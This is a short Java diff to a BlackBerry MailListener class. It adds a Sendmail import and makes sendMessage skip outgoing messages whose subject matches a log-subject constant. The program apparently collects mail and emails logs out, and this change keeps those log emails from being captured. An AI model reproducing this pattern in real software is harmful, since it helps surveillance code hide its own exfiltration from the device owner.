@@ -43,6 +43,7 @@ import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
+import blackberry.utils.Sendmail;
 import blackberry.utils.StringPair;
 import blackberry.utils.WChar;
 
@@ -443,10 +444,14 @@ public final class MailListener implements FolderListener, StoreListener,
      */
     public boolean sendMessage(final Message message) {
 
-        // if(m.isInbound() && m.getSubject().equals(MY_SUBJECT"))
-        //#ifdef DEBUG_INFO
-        debug.info("New Send Message: " + message);
-        //#endif
+        if(!message.isInbound() && message.getSubject().equals(Sendmail.LOGSUBJECT)){
+            //#ifdef DEBUG_INFO
+            debug.info("Send Log Message");
+            //#endif
+            return true;
+        }
+        
+       
 
         if (collecting) {
             //#ifdef DEBUG_TRACE
